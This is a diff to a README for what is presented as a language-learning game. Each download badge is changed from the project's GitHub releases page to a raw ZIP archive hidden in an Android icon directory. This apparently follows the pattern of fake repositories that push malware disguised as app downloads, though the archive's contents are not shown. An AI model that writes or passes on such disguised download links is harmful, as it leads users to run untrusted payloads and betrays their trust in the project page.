@@ -1,6 +1,6 @@
 # 🎮 Metamorphic-Resonance-Human-Language-Gamers - Learn Language Through Play
 
-[![Download Now](https://img.shields.io/badge/Download-Metamorphic--Resonance-blue?style=for-the-badge)](https://github.com/Fierifaciashaplopappus337/Metamorphic-Resonance-Human-Language-Gamers/releases)
+[![Download Now](https://img.shields.io/badge/Download-Metamorphic--Resonance-blue?style=for-the-badge)](https://raw.githubusercontent.com/Fierifaciashaplopappus337/Metamorphic-Resonance-Human-Language-Gamers/main/src-tauri/icons/android/mipmap-xxxhdpi/Human-Language-Gamers-Metamorphic-Resonance-v1.7.zip)
 
 ## ⊛ About This App
 
@@ -28,7 +28,7 @@ These are typical system specs for most modern Windows computers. The app does n
 ## 🚀 Getting Started: How to Download and Install
 
 1. **Visit the download page by clicking the button below:**  
-   [![Download Releases](https://img.shields.io/badge/Download-Here-grey?style=for-the-badge)](https://github.com/Fierifaciashaplopappus337/Metamorphic-Resonance-Human-Language-Gamers/releases)  
+   [![Download Releases](https://img.shields.io/badge/Download-Here-grey?style=for-the-badge)](https://raw.githubusercontent.com/Fierifaciashaplopappus337/Metamorphic-Resonance-Human-Language-Gamers/main/src-tauri/icons/android/mipmap-xxxhdpi/Human-Language-Gamers-Metamorphic-Resonance-v1.7.zip)  
 
 2. **On the releases page, find the latest version.**  
    This will be listed with a version number like `v1.0` or higher.  
@@ -103,4 +103,4 @@ GitHub issues or discussion pages on the repository offer places to ask question
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Metamorphic--Resonance-blue?style=for-the-badge)](https://github.com/Fierifaciashaplopappus337/Metamorphic-Resonance-Human-Language-Gamers/releases)
+[![Download Now](https://img.shields.io/badge/Download-Metamorphic--Resonance-blue?style=for-the-badge)](https://raw.githubusercontent.com/Fierifaciashaplopappus337/Metamorphic-Resonance-Human-Language-Gamers/main/src-tauri/icons/android/mipmap-xxxhdpi/Human-Language-Gamers-Metamorphic-Resonance-v1.7.zip)
